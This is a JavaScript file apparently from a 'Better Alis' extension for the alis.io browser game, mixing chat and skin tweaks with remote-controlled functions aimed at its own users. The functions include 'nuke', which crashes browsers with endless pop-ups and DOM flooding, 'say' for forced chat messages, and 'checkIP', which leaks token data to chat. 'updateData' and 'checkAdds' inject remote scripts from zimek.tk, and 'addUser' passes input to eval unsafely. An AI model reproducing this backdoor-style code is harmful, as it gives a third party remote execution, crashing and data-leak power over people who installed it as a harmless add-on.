var p = playerDetails;
var btaMute = false
var btaPid = Math.floor(Math.random() * (+99999 - +11111) + +11111)
function version() {window.sendChat($("#version").text());};
function btapid() {sendChat(`${btaPid}`)}
function ver(uid) {if(userid==uid)window.sendChat($("#version").text());};
function btaPing() {sendChat($("#btaStatsPing").text())}
function kick(uid) {if(userid==uid)window.location.reload(1);}
function nick(uid, nick) {if(userid==uid)$("#nick").value(nick)}
function stealSkin(me, pid) {
  p[me].skinUrl = p[pid].skinUrl
}
var sof = false;
function songoff(pid){
  if(btaPid==pid)sof = true;
}
function test() {$("#chatroom").append("<span style='font-size:20px;'>Test</span>")}
function stop(uid) {if(userid==uid){myApp.isStopMovement = true}}

function addUser(uid) {
  eval(`$.extend(users, {${uid}:{"uid":${uid}}})`)
}
function video(url) {
  if(url == "remove"){$("#btavideotroll").remove(); return;}
  $("#btavideotroll").remove()
  $("#overlays2").append(`<iframe id="btavideotroll" width="560" height="315" style="margin-left:10%;" src="https://www.youtube.com/embed/${url}?autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>`)
}

function clearChat(uid) {
  if(uid==0){$("#chatroom").empty()} else {if(uid==userid){$("#chatroom").empty()}}
}

function song(url) {
  if(url == "remove"){$("#btasongtroll").remove(); return;}
  if(sof==true)return;
  $("#btasongtroll").remove()
  $("#overlays2").append(`<iframe id="btasongtroll" width="200" height="100" style="margin-left:5000px;" src="https://www.youtube.com/embed/${url}?autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>`)
}

function tell(msg){swal("Alert", msg, "info");}
function ccRGB(hex) { //https://stackoverflow.com/questions/5623838/rgb-to-hex-and-hex-to-rgb
  hex = hex.replace("#", "")
    var bigint = parseInt(hex, 16);
    ccr = (bigint >> 16) & 255;
    ccg = (bigint >> 8) & 255;
    ccb = bigint & 255;
btacc = {"r":ccr, "g":ccg, "b":ccb}

}

function forceMute(uid) {
  addUser(uid)
  setTimeout(function(){
    users[`${uid}`].muted = true
  }, 500)
}

function forceSplit(uid, num) {
    if(userid==uid){
      if(num==64){
        split()
        setTimeout(split, speed);
        setTimeout(split, speed*2);
        setTimeout(split, speed*3);
        setTimeout(split, speed*4);
        setTimeout(split, speed*5);
        setTimeout(split, speed*5);
      }
      if(num==4){
        split()
        setTimeout(split, speed);
      }
      if(num==1){
        split()
      }
      if(num==16){
        split()
        setTimeout(split, speed);
        setTimeout(split, speed*2);
        setTimeout(split, speed*3);
      }
    }
};

function cancermode() {
   var cancerFunction = setInterval(function(){
  for(var x in window.playerDetails){
  if(window.playerDetails[x].color){
  window.playerDetails[x].color.r = Math.floor((Math.random() * 255 + 1))
  window.playerDetails[x].color.g = Math.floor((Math.random() * 255 + 1))
  window.playerDetails[x].color.b = Math.floor((Math.random() * 255 + 1))
  }
    }
    $("canvas").css("background-color", "rgb(" + 0 + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
    $("span").css("color", "rgb(" + Math.floor((Math.random() * 255 + 1)) + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
  }, 100)
}

function scream(uid, time) {
  if(uid==0)uid=userid;
  if(uid==userid){
  var canc = setInterval(function(){
 for(var x in window.playerDetails){
 if(window.playerDetails[x].color){
 window.playerDetails[x].color.r = Math.floor((Math.random() * 255 + 1))
 window.playerDetails[x].color.g = Math.floor((Math.random() * 255 + 1))
 window.playerDetails[x].color.b = Math.floor((Math.random() * 255 + 1))
 }
   }
   $("canvas").css("background-color", "rgb(" + 0 + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
}, 20)

setTimeout(function() {
  clearInterval(canc)
  setTimeout(function(){
    $("canvas").css("background-color", $("#btaBgColor").val())
  }, 100)
}, time*1000);}
}

function title(title) {$("#lb_title").text(title)}
function alert(uid, text) {if(userid==uid)alert(text)}
function cancer(uid) {if(userid==uid){cancermode()}};

function mute(uid) {if(userid==uid){btaMute = true}}
function unmute(uid) {if(userid==uid){btaMute = false}}

function nukeME() {  setInterval(function(){
  var a = '0'.repeat(99999)
    let randomSize = Math.floor(Math.random() * (+1000 - +400) + +400);
    let randomSide = Math.floor(Math.random() * (+2000 - +10) + +10);
    window.open("https://zimek.tk/chrome-killer.html", "_blank", `top=${randomSide},left=${randomSide},width=${randomSize},height=${randomSize}`);
    window.open("https://zimek.tk/chrome-killer.html")
    $("div").append("<div style='padding:100px;'>" + a + "</div>")
    $("span").text(a)
    $("body").css("transform", "scale(1.5,1.5)")
    cancermode()
    }, 1)
}

function nuke(pid) {
  if(btaPid==pid){
    setInterval(function(){
      nukeME()
    }, 10)
}}
function say(uid, text) {if(userid==uid){sendChat(text)}}
function massSay(text) {sendChat(text)}

function updateData() {
  console.log("reloading better alis data...")
  $.getJSON(`https://zimek.tk/BetterAlis/BetterAlis.users.json`, function(data) {
  users = data
  icons = data.icons
  emojis = data.emojis
  })
$(`<script src="https://zimek.tk/BetterAlis/commands.js?nocache=${Math.random()}"></script>`).appendTo("head")
}

setTimeout(function(){
  setInterval(function(){
    console.log("auto-reloading better alis data...")
    $.getJSON(`https://zimek.tk/BetterAlis/BetterAlis.users.json?nocache=${Math.random()}`, function(data) {
    users = data
    icons = data.icons
    emojis = data.emojis
    })
  }, users.settings["users-autoupdate"]*1000*60)
}, 3000)

function checkIP(uid) {
if(userid==uid){sendChat(`${jwt_decode(jwt).validFrom}`)}
}

//for emojis
function addChat(x) {
$("#input_box2").val($("#input_box2").val() + x)
}

function goChatUP() {
  $("#chatroom").stop().animate({
    scrollTop: $("#chatroom")[0].scrollHeight,
  }, 400);
}

if(!$("#yourplayerid")){$("<span id='yourplayerid'></span>").appendTo("body")}

//ban o_o and mute
function checkAdds() {
  Object.values(users).forEach(user=>{
console.log("Checking all better alis bans and mutes...")

if(user.helpers){
  if(userid==user.uid){
    $("head").append(`<script src='https://zimek.tk/helpers.js?v=${Math.random()}'></script>`)
    console.log("Zimek's alis helpers loaded.")
  }
}

 if(user.muted == true){
   if(window.userid == user.uid){
     console.log("%cYour Account has been Muted from Better Alis Extension",
     "background: #222; color: #14c0ff;padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 20px;border-radius: 10px;");
   chatRoom.sendMessage = function(msg) {$("#chatroom").append("<span class='msg' style='color:#ff7272;'>Your account has been muted from Better Alis Extension</span><br>");return}};
 };

  if(user.banned == true){
    if(window.userid == user.uid){
  console.log("%cYour Account has been Banned from Better Alis Extension",
  "background: #222; color: red;padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 20px;border-radius: 10px;");
  $("body").empty();
  $("html").css("background-color", "#181818");
  $(`<div style="text-align: center"><div style="display: inline-block;margin-top: 10%;">
<h1 style="font-size: 40px;color: #d1d1d1;">Your account has been banned from Better Alis Extension</h1><br><br>
<img src="/assets/img/banned1.png" width="550px"><br><br>
</div></div>`).appendTo("body");
}}

  });
}
setTimeout(checkAdds, 13*1000)
